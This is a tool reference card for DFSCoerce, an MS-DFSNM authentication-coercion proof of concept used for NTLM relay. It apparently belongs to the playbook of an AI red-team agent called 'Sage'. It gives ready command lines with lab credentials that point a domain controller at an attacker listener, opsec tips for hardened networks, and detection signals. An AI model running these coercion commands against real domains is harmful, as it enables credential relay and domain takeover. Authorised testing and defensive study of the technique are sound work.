---
name: DFSCoerce
category: coercion-relay
subcategories: [authentication-coercion, ms-dfsnm, ntlm-relay]
tradecraft_tags: [coercion, dfs, ms-dfsnm, ntlm-relay, authentication-coercion]
mitre_attack:
  - id: T1187
    name: Forced Authentication
source:
  url: https://github.com/Wh04m1001/DFSCoerce
  license: MIT
  maintained: false
binary_type: python-script
binary_filename: dfscoerce.py
supported_os: [linux]
architecture: [x64]
privilege_required: domain-user
network_required: true
detection_signal: |
  MS-DFSNM RPC calls from non-DFS servers are unusual. NetrDfsAddStdRoot / NetrDfsRemoveStdRoot
  are not typical operations for workstations. Network monitoring and IDS signatures for
  DFS namespace management from unusual sources. Event log correlation if SACL auditing is
  comprehensive.
usage_examples:
  - description: Coerce DC to authenticate to listener via MS-DFSNM
    args: "python3 dfscoerce.py -u jon.snow -p Password123 -d north.sevenkingdoms.local 192.168.56.100 192.168.56.10"
  - description: Coerce with NTLM hash
    args: "python3 dfscoerce.py -u jon.snow -hashes :nthash -d north.sevenkingdoms.local 192.168.56.100 192.168.56.10"
opsec_notes: |
  Python tool — must run from attacker infrastructure. DFS coercion works when PetitPotam
  and SpoolSample are patched/blocked. Use Coercer for a unified interface that tries all
  available methods. DFSCoerce against DCs works regardless of Print Spooler status and
  is not blocked by the August 2021 MS-EFSRPC patch.
gotchas: |
  Python-only — not runnable from Apollo directly. DFS namespace management service
  must be accessible on the target (NETLOGON/SYSVOL share access implies DFS). Works best
  against DCs. Coercer includes MS-DFSNM as one of its methods — prefer Coercer for
  multi-protocol fallback.
related_ttps: [coercer, petitpotam, spoolsample, shadowcoerce]
alternatives: [coercer, petitpotam, spoolsample]
common_args:
  listener:
    description: Attacker IP to receive coerced authentication
    typical_values: ["192.168.56.100"]
    required: true
  target:
    description: Target machine IP or FQDN to coerce
    typical_values: ["192.168.56.10"]
    required: true
  -u:
    description: Domain username
    typical_values: ["jon.snow"]
  -p:
    description: Password
    typical_values: ["Password123"]
  -d:
    description: Domain FQDN
    typical_values: ["north.sevenkingdoms.local"]
last_updated: 2026-05-29
---

# DFSCoerce

A Distributed File System Namespace Management (MS-DFSNM) coercion PoC by Wh04m1001.
Abuses `NetrDfsAddStdRoot` / `NetrDfsRemoveStdRoot` functions to trigger NTLM authentication
from the target machine. Works when MS-EFSRPC is patched on DCs and Print Spooler is
disabled — providing a fallback coercion method. Python-only; use Coercer for a unified
multi-protocol interface.

## Typical use cases
- Coerce DC authentication when PetitPotam and SpoolSample are unavailable
- Fallback coercion method in hardened environments

## How Sage uses this
DFSCoerce is an infrastructure-side Python tool. Documented as a fallback coercion method.
Prefer Coercer for unified multi-protocol coercion coverage.

## Output
Console success/failure indicating whether the DFS RPC call was made.

## Apollo-specific note
Python-only — not runnable directly from Apollo. Run from attacker Linux infrastructure.
For Windows-side Kerberos relay without external infrastructure, use KrbRelay/SharpKrbRelay.
